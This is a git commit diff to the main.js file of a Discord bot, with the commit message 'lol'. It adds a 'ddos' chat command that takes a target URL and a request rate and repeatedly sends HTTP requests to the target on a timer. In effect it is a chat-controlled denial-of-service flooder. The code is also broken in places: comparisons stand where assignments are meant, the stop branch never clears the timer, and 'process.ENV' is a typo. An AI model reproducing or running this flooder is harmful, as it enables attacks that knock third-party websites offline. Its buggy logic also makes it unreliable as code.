0ce6bf41dd5c7fca1b3a1fff8a4626eb599dbcec
root <rekkun1@xkx.me>
2020-02-26 21:27:00 +0000

    lol

--- main.js
+++ main.js
@@ -3,6 +3,8 @@ const client = new Discord.Client();
 const request = require('request');
 const auth = require('./auth.json');
 
+
+
 client.on('ready', () => {
     console.log(`Logged in as ${client.user.tag}!`);
 	client.user.setPresence({
@@ -16,7 +18,7 @@ client.on('ready', () => {
 
 
 client.on('message', message => {
-
+var ATK;
 if (message.author.bot) return;
 const prefix = auth.prefix;
 if (message.content.startsWith(prefix)) {
@@ -24,28 +26,38 @@ if (message.content.startsWith(prefix)) {
 	const args = message.content.slice(prefix.length).trim().split(/ +/g);
     const command = args.shift().toLowerCase();
 	
+	
 	if(command === 'ping') {
 		message.channel.send('Pong!')
 	}
-	if(command === 'atk') {
-		var arr = message.content.split(" ");
-		var target = arr[1];
-		var req = arr[2];
-		var req_per_sec = 1000/req;
-		
-		message.channel.send('Running');
-		function sendReq() {
+	if(command === 'ddos') {
+		var arr = message.content.split(" "),
+			target,
+			req,
+			req_per_sec;
+			function sendReq() {
+				if (typeof(target) === 'undefined') {console.log('Sẵn sàng')}
+				else {
 				request(target, function (error, response, body){
-				if(error) {console.log(error)}
-					else{console.log('OK')}
-				}
-			)}
-		 const Attack = setInterval(() => sendReq(), req_per_sec)
-	}
-	if(command === 'stop') {
-		clearInterval(Attack)
+						if(error) {console.log(error)}
+						else{console.log('OK')}
+					}
+				)}
+			}
+		console.log(arr[1])
+		if (arr[1] === 'on'){
+			target = arr[2];
+			req === arr[3];
+			req_per_sec === 1000/req;
+			message.channel.send('ON');
+		}
+		if (arr[1] === 'off'){
+			target = arr[2];
+		}
+		ATK = setInterval(() => sendReq(), req_per_sec)
 	}
 }
+
 })
 
-client.login(process.env.TOKEN)
+client.login(process.ENV.TOKEN)
